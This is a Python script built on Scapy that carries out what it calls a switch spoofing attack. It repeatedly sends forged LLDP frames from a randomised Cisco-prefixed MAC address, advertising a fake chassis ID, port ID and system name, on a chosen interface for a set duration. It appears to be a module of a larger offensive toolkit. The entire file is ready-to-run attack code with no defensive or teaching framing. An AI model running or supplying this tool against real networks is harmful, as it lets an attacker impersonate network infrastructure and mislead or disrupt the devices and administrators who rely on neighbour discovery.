from scapy.all import Ether, Dot3, LLC, SNAP, sendp
import argparse
import time
import threading
import struct

spoofing_active = False

def execute(args):
    """Execute switch spoofing attack"""
    global spoofing_active
    
    print(f"[Switch Spoofing] Starting attack on interface {args.interface}")
    
    try:
        chassis_id = args.chassis_id if args.chassis_id else "Cisco-Switch-01"
        port_id = args.port_id if args.port_id else "GigabitEthernet1/0/1"
        system_name = args.system_name if args.system_name else "Cisco-Catalyst-2960"
        
        print(f"[Switch Spoofing] Chassis ID: {chassis_id}")
        print(f"[Switch Spoofing] Port ID: {port_id}")
        print(f"[Switch Spoofing] System Name: {system_name}")
        
        spoofing_active = True
        
        spoof_thread = threading.Thread(
            target=switch_spoofing_loop,
            args=(args.interface, chassis_id, port_id, system_name, args.interval)
        )
        spoof_thread.daemon = True
        spoof_thread.start()
        
        duration = args.duration if args.duration else 60
        print(f"[Switch Spoofing] Running for {duration} seconds. Press Ctrl+C to stop early.")
        
        time.sleep(duration)
        
        spoofing_active = False
        print("[Switch Spoofing] Attack stopped")
        
        return True
        
    except Exception as e:
        print(f"[Switch Spoofing] Error: {e}")
        spoofing_active = False
        return False

def switch_spoofing_loop(interface, chassis_id, port_id, system_name, interval=5):
    """Continuously send switch spoofing packets"""
    print("[Switch Spoofing] Starting spoofing loop")
    
    while spoofing_active:
        try:
            send_lldp_packet(interface, chassis_id, port_id, system_name)
            
            time.sleep(interval if interval else 5)
            
        except Exception as e:
            print(f"[Switch Spoofing] Error in spoofing loop: {e}")
            break
    
    print("[Switch Spoofing] Stopped spoofing loop")

def send_lldp_packet(interface, chassis_id, port_id, system_name):
    """Send LLDP spoofing packet using raw TLV construction"""
    dst_mac = "01:80:c2:00:00:0e"
    
    import random
    cisco_oui = "00:00:0c"
    nic_part = ":".join([f"{random.randint(0, 255):02x}" for _ in range(3)])
    src_mac = f"{cisco_oui}:{nic_part}"
    
    lldp_payload = b""
    
    # Chassis ID TLV (Type 1)
    chassis_id_bytes = chassis_id.encode()
    lldp_payload += struct.pack(">H", 0x0200 + len(chassis_id_bytes))
    lldp_payload += b"\x04"
    lldp_payload += chassis_id_bytes
    
    # Port ID TLV (Type 2)
    port_id_bytes = port_id.encode()
    lldp_payload += struct.pack(">H", 0x0400 + len(port_id_bytes))
    lldp_payload += b"\x03"
    lldp_payload += port_id_bytes
    
    # TTL TLV (Type 3)
    lldp_payload += struct.pack(">HH", 0x0602, 120) 
    
    # System Name TLV (Type 5) - Optional
    system_name_bytes = system_name.encode()
    lldp_payload += struct.pack(">H", 0x0a00 + len(system_name_bytes))
    lldp_payload += system_name_bytes
    
    lldp_payload += b"\x00\x00"
    
    lldp_packet = (
        Ether(dst=dst_mac, src=src_mac, type=0x88cc) /  
        lldp_payload
    )
    
    sendp(lldp_packet, iface=interface, verbose=False)
    print(f"[Switch Spoofing] Sent LLDP packet: {chassis_id} - {port_id}")

def add_arguments(parser):
    """Add switch spoofing specific arguments to parser"""
    parser.add_argument("--chassis-id", help="Chassis ID to spoof")
    parser.add_argument("--port-id", help="Port ID to spoof")
    parser.add_argument("--system-name", help="System name to spoof")
    parser.add_argument("--interval", type=int, help="Interval between packets in seconds")
    parser.add_argument("--duration", "-d", type=int, help="Attack duration in seconds")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Switch Spoofing Attack")
    parser.add_argument("--interface", "-i", required=True, help="Network interface")
    parser.add_argument("--chassis-id", help="Chassis ID to spoof")
    parser.add_argument("--port-id", help="Port ID to spoof")
    parser.add_argument("--system-name", help="System name to spoof")
    parser.add_argument("--interval", type=int, default=5, help="Interval between packets in seconds")
    parser.add_argument("--duration", "-d", type=int, default=60, help="Attack duration in seconds")
    
    args = parser.parse_args()
    
    import os
    if os.geteuid() != 0:
        print("[-] This script requires root privileges. Run with sudo.")
        exit(1)
    
    execute(args)